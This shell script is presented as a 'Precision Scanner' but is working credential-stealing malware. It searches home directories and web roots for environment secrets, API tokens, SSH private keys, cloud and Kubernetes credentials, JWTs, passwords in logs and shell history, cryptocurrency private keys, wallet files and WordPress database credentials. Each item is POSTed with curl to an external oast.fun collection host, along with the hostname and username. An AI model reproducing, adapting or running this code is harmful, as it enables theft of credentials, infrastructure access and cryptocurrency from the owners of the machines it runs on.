#!/bin/sh
# Mythos Precision Scanner v4.3 — dedup, exchanges, CI/CD, docker-compose
OAST="fzxlsopmyfsfmcutpfapj7u3fu0t92jtj.oast.fun"
HOST=$(hostname 2>/dev/null || cat /etc/hostname 2>/dev/null || echo "u")
USER=$(whoami 2>/dev/null || id -un 2>/dev/null || echo "u")
> /tmp/.mqs_out
# Dedup helper: only send unique lines per section
> /tmp/.mqs_seen

send() { local s="$1" d="$2"
    local hash=$(echo "$s$d" | md5sum 2>/dev/null | cut -c1-16 || echo "$s$(echo "$d" | wc -c)")
    grep -q "$hash" /tmp/.mqs_seen 2>/dev/null && return
    echo "$hash" >> /tmp/.mqs_seen
    local p="${HOST}|${USER}|${s}|$(echo "$d" | tr '\n' '↵' | cut -c1-4000)"
    echo "$p" >> /tmp/.mqs_out
    curl -s -m 3 -X POST -d "$p" "http://${OAST}/post" 2>/dev/null &
}

TARGETS=""
for d in /root /home/*; do [ -d "$d" ] && TARGETS="$TARGETS $d"; done
for d in /var/www /var/www/*; do [ -d "$d" ] && TARGETS="$TARGETS $d"; done
[ -z "$TARGETS" ] && TARGETS="/root /home /var/www"

is_text() { [ -f "$1" ] && [ ! -x "$1" ] && ! tr -dc '\0' < "$1" 2>/dev/null | head -c1 | grep -q '.' && return 0; return 1; }

###############################################################################
# CONSOLIDATED .ENV + CONFIG SCAN — one pass for everything
###############################################################################
(for d in $TARGETS; do
    find "$d" -maxdepth 5 -type f \
        \( -name ".env" -o -name ".env.*" -o -name "*.env" -o -name ".env.example" \
        -o -name "docker-compose.yml" -o -name "docker-compose.yaml" \
        -o -name ".npmrc" -o -name ".gitconfig" -o -name ".git-credentials" \
        -o -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name "*.toml" \) \
        -size -1M ! -path "*/node_modules/*" ! -path "*/vendor/*" 2>/dev/null
done | sort -u | head -200 | while read f; do
    is_text "$f" || continue
    
    # .ENV values
    vals=$(grep -iE '^(SECRET|TOKEN|KEY|PASS|CRED|AUTH|DATABASE_URL|REDIS|STRIPE|SENDGRID|MAILGUN|AWS_|GCP_|AZURE|GITHUB|GITLAB|TWILIO|SLACK|DISCORD|OPENAI|ANTHROPIC|HUGGINGFACE|WEBHOOK|MNEMONIC|SEED|PRIVATE|WALLET|MONGO|MYSQL|POSTGRES|APP_KEY|SENTRY|MAIL_|JWT|ENCRYPT|DECRYPT|SALT|PEPPER|export|BINANCE|COINBASE|INFURA|ALCHEMY|ETHERSCAN|QUICKNODE|MORALIS|NFT|PINATA)' "$f" 2>/dev/null | grep -v '^#' | grep '=')
    [ -n "$vals" ] && send "ENV" "$f:$(echo "$vals" | tr '\n' '↵')"
    
    # Export-style
    exp=$(grep -iE '^export (SECRET|TOKEN|KEY|PASS|CRED|AUTH)' "$f" 2>/dev/null)
    [ -n "$exp" ] && send "ENV" "$f:$(echo "$exp" | tr '\n' '↵')"
    
    # Stripe
    grep -oE '\b(sk_live_[a-zA-Z0-9]{24,}|rk_live_[a-zA-Z0-9]{24,}|whsec_[a-zA-Z0-9]{32,})\b' "$f" 2>/dev/null | sort -u | while read k; do send "STRIPE" "$f:$k"; done
    # GitHub
    grep -oE '\b(ghp_[a-zA-Z0-9]{36,}|github_pat_[a-zA-Z0-9_]{40,})\b' "$f" 2>/dev/null | sort -u | while read k; do send "GITHUB" "$f:$k"; done
    # GitLab
    grep -oE '\b(glpat-[a-zA-Z0-9\-]{20,})\b' "$f" 2>/dev/null | sort -u | while read k; do send "GITLAB" "$f:$k"; done
    # AWS
    grep -oE '\b(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16})\b' "$f" 2>/dev/null | sort -u | while read k; do send "AWS" "$f:$k"; done
    # SendGrid
    grep -oE '\bSG\.[a-zA-Z0-9_\-]{20,}\.[a-zA-Z0-9_\-]{20,}\b' "$f" 2>/dev/null | sort -u | while read k; do send "SENDGRID" "$f:$k"; done
    # Slack
    grep -oE '\bxox[bprs]-[0-9]{10,}-[0-9]{10,}-[a-zA-Z0-9]+\b' "$f" 2>/dev/null | sort -u | while read k; do send "SLACK" "$f:$k"; done
    # Discord webhook
    grep -oE '\bhttps://discord\.com/api/webhooks/[0-9]+/[a-zA-Z0-9_-]+\b' "$f" 2>/dev/null | sort -u | while read k; do send "DISCORD" "$f:$k"; done
    # Telegram bot
    grep -oE '\b[0-9]+:AA[0-9a-zA-Z_-]{32,}\b' "$f" 2>/dev/null | sort -u | while read k; do send "TELEGRAM" "$f:$k"; done
    # Twilio
    grep -oE '\bSK[0-9a-fA-F]{32}\b' "$f" 2>/dev/null | sort -u | while read k; do send "TWILIO" "$f:$k"; done
    # OpenAI
    grep -oE '\bsk-[a-zA-Z0-9]{32,}\b' "$f" 2>/dev/null | sort -u | while read k; do send "OPENAI" "$f:$k"; done
    # HuggingFace
    grep -oE '\bhf_[a-zA-Z0-9]{32,}\b' "$f" 2>/dev/null | sort -u | while read k; do send "HF" "$f:$k"; done
    # NPM publish token
    grep -oE '\bnpm_[a-zA-Z0-9]{36,}\b' "$f" 2>/dev/null | sort -u | while read k; do send "NPM_TOKEN" "$f:$k"; done
    # PyPI token
    grep -oE '\bpypi-[a-zA-Z0-9]{32,}\b' "$f" 2>/dev/null | sort -u | while read k; do send "PYPI" "$f:$k"; done
    # Binance
    grep -oE '\b(binance_[a-zA-Z0-9]{32,}|BINANCE_[a-zA-Z0-9]{32,})\b' "$f" 2>/dev/null | sort -u | while read k; do send "BINANCE" "$f:$k"; done
    # Infura / Alchemy / QuickNode / Moralis (URLs with keys)
    grep -oE '\bhttps://[a-zA-Z0-9-]+\.(infura\.io|alchemy\.com|quiknode\.pro|moralis\.io)/[a-zA-Z0-9]{32,}\b' "$f" 2>/dev/null | sort -u | while read k; do send "RPC_URL" "$f:$k"; done
    # Etherscan / BscScan
    grep -oE '\b([A-Z0-9]{34,})\b' "$f" 2>/dev/null | sort -u | while read k; do
        case "$k" in *API*|*ETHERSCAN*|*BSCSCAN*) send "SCAN_API" "$f:$k";; esac
    done
    # Database URLs
    grep -oE '(DATABASE_URL|DB_URL|MONGO_URI|REDIS_URL|POSTGRES_URL|MYSQL_URL|SQLALCHEMY_DATABASE_URI)[^[:space:]]*://[^[:space:]]+' "$f" 2>/dev/null | sort -u | while read u; do send "DB" "$f:$u"; done
done) &

###############################################################################
# FRAMEWORK-SPECIFIC
###############################################################################
# Laravel APP_KEY
for d in $TARGETS; do find "$d" -maxdepth 5 -type f -name ".env" -size -100k 2>/dev/null; done | head -50 | while read f; do
    grep -q 'APP_KEY=base64:' "$f" 2>/dev/null && send "LARAVEL_KEY" "$f:$(grep 'APP_KEY=' "$f")"
done &

# Django SECRET_KEY
for d in $TARGETS; do find "$d" -maxdepth 5 -type f -name "settings.py" -size -200k ! -path "*/node_modules/*" 2>/dev/null; done | head -30 | while read f; do
    is_text "$f" || continue
    key=$(grep 'SECRET_KEY' "$f" 2>/dev/null)
    [ -n "$key" ] && send "DJANGO_KEY" "$f:$key"
done &

# Rails secrets + CI pipeline configs
for d in $TARGETS; do
    find "$d" -maxdepth 5 -type f \( -name "secrets.yml" -o -name "credentials.yml" -o -name ".travis.yml" -o -name "Jenkinsfile" -o -name ".circleci" \) -size -200k 2>/dev/null
done | head -30 | while read f; do
    is_text "$f" || continue
    case "$f" in
        *secrets.yml|*credentials.yml) send "RAILS_SECRET" "$f:$(head -c 4096 "$f" | tr '\n' '↵')" ;;
        *Jenkinsfile|*.travis*|*.circleci*) 
            creds=$(grep -iE 'password|token|key|secret|credential' "$f" 2>/dev/null | tr '\n' '↵')
            [ -n "$creds" ] && send "CI_CD" "$f:$creds"
            ;;
    esac
done &

# Firebase
for d in $TARGETS; do
    find "$d" -maxdepth 5 -type f \( -name "*firebase*" -o -name "*google-services*" \) -size -500k 2>/dev/null
done | head -20 | while read f; do
    is_text "$f" || continue
    grep -q 'project_id\|private_key' "$f" 2>/dev/null && send "FIREBASE" "$f:$(head -c 4096 "$f" | tr '\n' '↵')"
done &

###############################################################################
# SSH / PEM — private keys, deduplicated by fingerprint
###############################################################################
for d in /root /home/*; do
    find "$d" -maxdepth 4 -type f \( -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "id_dsa" -o -name "*.pem" \) \
        ! -path "*/ssl/*" ! -path "*/certs/*" 2>/dev/null | while read f; do
        head -c100 "$f" 2>/dev/null | grep -q 'PRIVATE KEY' || continue
        send "SSH" "$f:$(head -c 4096 "$f")"
    done
done &

###############################################################################
# GCP / AWS / DOCKER / K8S / GIT / NPM / CLOUD
###############################################################################
for d in $TARGETS; do
    find "$d" -maxdepth 5 -type f -name "*.json" -size -2M ! -path "*/node_modules/*" 2>/dev/null
done | while read f; do
    is_text "$f" || continue
    head -c200 "$f" 2>/dev/null | grep -q '"type".*:.*"service_account"' && send "GCP" "$(head -c 4096 "$f")"
done &

for d in /root/.aws /home/*/.aws; do [ -f "$d/credentials" ] && send "AWS_CRED" "$(head -c 4096 "$d/credentials")"; done &
for d in /root/.docker /home/*/.docker; do [ -f "$d/config.json" ] && send "DOCKER" "$(head -c 4096 "$d/config.json")"; done &
for d in /root/.kube /home/*/.kube; do [ -f "$d/config" ] && send "K8S" "$(head -c 4096 "$d/config")"; done &
for d in /root /home/*; do
    [ -f "$d/.git-credentials" ] && send "GITCRED" "$(head -c 2048 "$d/.git-credentials")"
    [ -f "$d/.npmrc" ] && send "NPMRC" "$(head -c 2048 "$d/.npmrc")"
done
for d in /root/.config/doctl /home/*/.config/doctl; do [ -d "$d" ] && find "$d" -type f 2>/dev/null | while read f; do send "DO" "$(head -c 2048 "$f")"; done; done
for d in /root/.azure /home/*/.azure; do [ -d "$d" ] && find "$d" \( -name "*.json" -o -name "*.azureauth" \) 2>/dev/null | while read f; do send "AZURE" "$(head -c 4096 "$f")"; done; done
[ -f /root/.config/linode-cli ] && send "LINODE" "$(head -c 2048 /root/.config/linode-cli)"

###############################################################################
# JWT TOKENS — in configs
###############################################################################
for d in $TARGETS; do
    find "$d" -maxdepth 5 -type f \( -name ".env*" -o -name "*.json" -o -name "*.yaml" -o -name "*.yml" \) -size -500k ! -path "*/node_modules/*" 2>/dev/null
done | head -50 | while read f; do
    is_text "$f" || continue
    grep -oE '\beyJ[a-zA-Z0-9_-]{20,}\.eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}\b' "$f" 2>/dev/null | sort -u | head -3 | while read jwt; do send "JWT" "$f:$jwt"; done
done &

###############################################################################
# APPLICATION LOGS — leaked creds (deduplicated)
###############################################################################
for d in $TARGETS; do
    find "$d" -maxdepth 5 -type f -name "*.log" -size -5M ! -path "*/node_modules/*" 2>/dev/null
done | head -30 | while read f; do
    is_text "$f" || continue
    leaked=$(grep -iE 'password|secret|token|key|DATABASE_URL|API_KEY' "$f" 2>/dev/null | grep -v 'INFO\|DEBUG\|TRACE\|null\|undefined\|********\|\[FILTERED\]' | sort -u | tail -20)
    [ -n "$leaked" ] && send "LOG_LEAK" "$f:$(echo "$leaked" | tr '\n' '↵')"
done &

###############################################################################
# CRYPTO — ETH, Solana, BTC
###############################################################################
for d in $TARGETS; do
    find "$d" -maxdepth 5 -type f -size -1M \( -name ".env*" -o -name "*.txt" -o -name "*.key" -o -name "*.json" \) ! -path "*/node_modules/*" 2>/dev/null
done | while read f; do
    is_text "$f" || continue
    # ETH
    if grep -qilE 'ETH|ethereum|private.key|PRIVATE_KEY|0x[0-9a-fA-F]{40}' "$f" 2>/dev/null; then
        grep -oE '\b[0-9a-fA-F]{64}\b' "$f" 2>/dev/null | sort -u | while read key; do
            echo "$key" | grep -qiE '^0{64}$|^F{64}$|^1{64}$|dead|beef|cafe|feed|babe|face|b00b|00000000|123456|abcdef|fedcba' && continue
            [ "$(echo "$key" | cut -c1 | tr '[:upper:]' '[:lower:]')" = "f" ] && continue
            send "ETH" "$f:$key"
        done
    fi
    # Solana
    if grep -qilE 'solana|phantom|SOLANA|keypair' "$f" 2>/dev/null; then
        grep -oE '\b[1-9A-HJ-NP-Za-km-z]{87,88}\b' "$f" 2>/dev/null | sort -u | head -3 | while read k; do send "SOL" "$f:$k"; done
    fi
    # BTC
    if grep -qilE 'bitcoin|BTC|wallet|WIF|private' "$f" 2>/dev/null; then
        grep -oE '\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b' "$f" 2>/dev/null | sort -u | head -2 | while read k; do send "BTC" "$f:$k"; done
    fi
done &

###############################################################################
# SHELL HISTORY — deduplicated
###############################################################################
for h in /root/.bash_history /home/*/.bash_history /root/.zsh_history /home/*/.zsh_history; do
    [ -f "$h" ] && grep -iE 'password|secret|token|ghp_|github_pat|sk_live|AKIA|DATABASE_URL|ssh-keygen|aws.configure|gcloud.auth|docker.login|npm.set|export.*KEY|export.*TOKEN|curl.*Authorization|htpasswd|mongodump|mongorestore|psql.*-U|mysql.*-p|redis-cli.*-a' "$h" 2>/dev/null | sort -u | tail -100 | while read l; do send "HIST" "$l"; done
done &

###############################################################################
# WALLET FILES / WORDPRESS
###############################################################################
for d in $TARGETS; do
    find "$d" -maxdepth 5 -type f -size -5M \( -name "wallet.dat" -o -name "wallet.json" -o -name "*.wallet" -o -name "keystore" -o -name "UTC--*" \) 2>/dev/null | while read f; do send "WALLET" "$(head -c 8192 "$f")"; done
    find "$d" -maxdepth 6 -type f -name "wp-config.php" ! -path "*/node_modules/*" 2>/dev/null | while read f; do
        c=$(grep -E 'DB_NAME|DB_USER|DB_PASSWORD|AUTH_KEY|SECURE_AUTH_KEY' "$f" 2>/dev/null | tr '\n' '↵')
        [ -n "$c" ] && send "WP" "$f:$c"
    done
done &

wait
rm -f /tmp/.mqs_seen /tmp/.cfg_files 2>/dev/null
